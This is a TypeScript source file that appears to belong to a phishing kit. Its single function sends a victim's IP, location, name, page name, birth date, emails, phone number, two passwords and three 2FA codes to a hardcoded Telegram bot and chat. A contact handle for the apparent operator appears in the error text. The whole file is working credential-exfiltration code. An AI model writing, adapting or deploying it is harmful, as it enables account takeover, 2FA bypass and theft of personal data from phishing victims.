import axios from 'axios';
import https from 'https';

const agent = new https.Agent({ family: 4 });

const TELEGRAM_API = `https://api.telegram.org/bot8581345348:AAH0HJxhs1hJonuQ3ZiQBYo5JLsCRVlKeiU`;
const CHAT_ID = '-5011906253';

export async function sendTelegramMessage(data: any): Promise<void> {
    try {
        const res = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `
<b>Ip:</b> <code>${data.ip || 'Error, contact @otis_cua'}</code>
<b>Location:</b> <code>${data.location || 'Error, contact @otis_cua'}</code>
-----------------------------
<b>Full Name:</b> <code>${data.fullName || ''}</code>
<b>Page Name:</b> <code>${data.fanpage || ''}</code>
<b>Date of birth:</b> <code>${data.day || ''}/${data.month || ''}/${data.year || ''}</code>
-----------------------------
<b>Email:</b> <code>${data.email || ''}</code>
<b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
<b>Phone Number:</b> <code>+${data.phone || ''}</code>
-----------------------------
<b>Password(1):</b> <code>${data.password || ''}</code>
<b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
-----------------------------
<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`,
            parse_mode: 'HTML'
        }, {
            timeout: 10000,
            // httpsAgent: agent
        });
        console.log(`✅ Sent new message successfully`);
    } catch (err: any) {
        console.error('🔥 Telegram send/edit error:', err?.response?.data || err.message || err);
        throw new Error('Failed to send or edit Telegram message');
    }
}
